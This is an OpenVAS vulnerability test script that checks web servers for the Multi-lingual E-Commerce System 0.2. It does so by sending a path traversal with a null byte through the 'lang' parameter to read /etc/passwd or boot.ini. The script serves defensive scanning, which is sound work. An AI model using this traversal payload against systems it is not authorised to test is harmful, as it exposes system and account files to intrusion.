###############################################################################
# OpenVAS Vulnerability Test
#
# Multi-lingual E-Commerce System Multiple Vulnerabilities
#
# Authors:
# Sooraj KS <kssooraj@secpod.com>
#
# Copyright:
# Copyright (C) 2010 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.801285");
  script_version("2022-02-18T13:05:59+0000");
  script_tag(name:"last_modification", value:"2022-02-18 13:05:59 +0000 (Fri, 18 Feb 2022)");
  script_tag(name:"creation_date", value:"2010-09-21 16:43:08 +0200 (Tue, 21 Sep 2010)");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_name("Multi-lingual E-Commerce System Multiple Vulnerabilities");
  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/8480/");
  script_xref(name:"URL", value:"http://www.securityfocus.com/archive/1/502798");

  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2010 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("find_service.nasl", "no404.nasl", "webmirror.nasl", "DDI_Directory_Scanner.nasl", "global_settings.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_tag(name:"impact", value:"Successful exploitation will allow attacker to obtain potentially
  sensitive information and to execute arbitrary PHP code in the context of the webserver process.");

  script_tag(name:"affected", value:"Multi-lingual E-Commerce System Version 0.2");

  script_tag(name:"insight", value:"- Local file inclusion vulnerability due to improper validation
  of user supplied input to the 'lang' parameter in index.php.

  - Information Disclosure vulnerability due to reserved information in database.inc.

  - Arbitrary File Upload vulnerability due to improper validation of files
  uploaded via product_image.php.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure
  of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer
  release, disable respective features, remove the product or replace the product by another one.");

  script_tag(name:"summary", value:"Multi-lingual E-Commerce System is prone to multiple Vulnerabilities.");

  script_tag(name:"solution_type", value:"WillNotFix");
  script_tag(name:"qod_type", value:"remote_app");
  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("port_service_func.inc");
include("list_array_func.inc");

port = http_get_port(default:80);

if(!http_can_host_php(port:port)){
  exit(0);
}

foreach dir (make_list_unique("/shop", "/genericshop", "/", http_cgi_dirs(port:port)))
{

  if(dir == "/") dir = "";

  res = http_get_cache(item: dir + "/index.php", port:port);

  if( ('<title>Multi-lingual Shop</title>' >< res) )
  {
    foreach file (make_list("etc/passwd","boot.ini"))
    {
      if(http_vuln_check(port:port, url:string (dir,"/index.php?lang=../../" +
                         "../../../../../../../../",file,"%00"),
                         pattern:"(root:.*:0:[01]:|\[boot loader\])"))
      {
        security_message(port:port);
        exit(0);
      }
    }
  }
}

exit(99);
